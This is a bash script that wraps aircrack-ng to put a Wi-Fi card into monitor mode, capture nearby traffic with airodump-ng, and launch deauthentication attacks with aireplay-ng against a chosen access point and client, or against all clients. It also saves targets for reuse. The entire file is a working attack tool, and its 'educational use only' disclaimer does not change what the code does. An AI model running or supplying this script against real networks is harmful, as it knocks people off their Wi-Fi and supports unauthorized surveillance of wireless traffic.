#!/bin/bash

# interfaces
interface=wlp8s0
interfaceMon=wlp8s0mon
# 1 = monitor mode is enabled
mangedMode=$(sudo airmon-ng | grep $interfaceMon | wc -l)
# color
green=`tput setaf 2`
red=`tput setaf 1`
reset=`tput sgr0`

# Welcome text
figlet "Aircrack"
echo "DISCLAIMER: For educational use only. Do NOT use on networks you don't own or have permissions to test!"
echo "- Created by Sondre"
echo ""

# check root permissions
if [ "$EUID" -ne 0 ]
 	then echo "${red}PLEASE RUN THIS SCRIPT AS ROOT!"
 	exit
else
 	echo "${green}Root OK${reset}" 
fi

# Check if Wi-Fi card is in monitor mode
if [ "$mangedMode" == "0" ]
	then
	echo ""
	echo "WARNING: Montior mode is not enabled."
	read -p 'Do you wish to enable monitor mode (y / n)?: ' option1

	if [ "$option1" == "y" ]
	then
		echo ""
		sudo airmon-ng start $interface > /dev/null
		echo "MONITOR MODE ENABLED"
	fi
else
	echo "${green}MONITOR MODE ENABLED: $interfaceMon ${reset}"
fi

# Choose operation
start () {
	echo ""
	echo "-- SELECT AN OPERATION --"
	echo "[1] Airodump: see traffic"
	echo "[2] De-auth: De-auth devices on network"
	echo "[3] Disable monitor mode for $interfaceMon"
	echo ""
	read -p 'Select operation: ' option2

	if [ "$option2" == "1" ]
		then
		sudo airodump-ng $interfaceMon
		echo "Done."
	elif [ "$option2" == "2" ]
		then
		echo ""
		if [ -f "file" ]
			then
			read -p "Load saved targets? (y/n) " load
			echo ""
		fi

	if [ "$load" == "y" ]
		then
		currentLine=1
		lines=$(wc -l < file)

		targets=$((lines / 4))

		echo "$targets saved targets"

		for i in $(eval echo "{1..$targets}"); do
			echo ""
			echo "[Target $i]"
			echo "Name: $(sed -n $((currentLine))p file)"
			echo "AP MAC: $(sed -n $((currentLine+1))p file)"
			echo "Client MAC: $(sed -n $((currentLine+2))p file)"
		  echo "Channel: $(sed -n $((currentLine+3))p file)"
		  currentLine=$((currentLine+4))
		done

		echo ""
		read -p "Enter target [1-$targets]: " targ
		targ=$((targ-1))
		currentLine=$((1+($targ*4)))
		name=$(sed -n $((currentLine))p file)
		ap=$(sed -n $((currentLine+1))p file)
		client=$(sed -n $((currentLine+2))p file)
		channel=$(sed -n $((currentLine+3))p file)

		echo ""
		echo "-- Selected target --"
		echo "Name: $name"
		echo "AP MAC: $ap"
		echo "Client MAC: $client"
	  echo "Channel: $channel"
	  echo ""
		read -p "Enter number of requests: " number
		echo ""
		deAuth
	else
		echo "-- New target --"
		read -p "Access point MAC address: " ap
		read -p "Client MAC address (leave empty for every device): " client
		read -p "Channel: " channel
		read -p "Number of de-auth request to send: " number
		read -p "Save target for later (y/n)?" save

		if [ "$save" == "y" ]
			then
			read -p "Name: " name
			printf "$name\n$ap\n$client\n$channel\n" >> file # save to file
		fi

		deAuth
	fi
elif [ "$option2" == "3" ]
	then
	echo "Stoppping interface..."
	sudo airmon-ng stop $interfaceMon > /dev/null
	echo "Done."
fi
}

deAuth () {
  echo "-- Starting de-auth attack ($number requests) --"
  sudo airmon-ng start $interfaceMon $channel > /dev/null
	if [ -z "$client" ]
	then
		sudo aireplay-ng -0 $number -a $ap $interfaceMon
	else
		sudo aireplay-ng -0 $number -a $ap -c $client $interfaceMon
	fi

	echo ""
	read -p "${green}Attack completed. Press any key to continue...${reset}" blah

	start
}

start